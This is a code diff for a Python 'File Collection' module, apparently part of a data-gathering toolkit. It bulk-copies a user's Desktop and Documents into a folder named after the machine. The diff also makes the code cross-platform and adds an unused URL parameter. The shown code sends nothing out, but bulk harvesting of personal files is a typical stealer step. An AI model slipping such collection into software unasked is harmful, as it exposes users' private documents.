@@ -1,10 +1,11 @@
 # modules/files_collection.py
 import os
 import shutil
+import platform
 
 def collect_files():
     home_path = os.path.expanduser("~")
-    pc_name = os.uname().nodename
+    pc_name = platform.uname().nodename
     save_path = os.path.join(home_path, pc_name)
 
     if not os.path.exists(save_path):
@@ -28,12 +29,20 @@ def collect_files():
     copy_files(desktop_path, os.path.join(save_path, "dosyalar"))
     copy_files(documents_path, os.path.join(save_path, "dosyalar"))
 
-def run():
+def run(url=""):
     from core.logger import save_log
     from core.ui import console, module_header, pause
-    
+
+    console.print(f"[bold cyan]File Collection Module[/bold cyan]")
+    if url:
+        console.print(f"URL fornecida: {url}")
+        # Aqui você pode usar a URL na sua lógica, se necessário
+    else:
+        console.print("Nenhuma URL fornecida.")
+
     module_header("File Collection", "Data Gathering")
     collect_files()
+
     path = os.path.join(os.path.expanduser("~"), platform.uname().nodename)
     save_log("file_collection", path, {"status": "completed"})
     console.print(f"[dim]File collection completed and logged at {path}[/dim]")
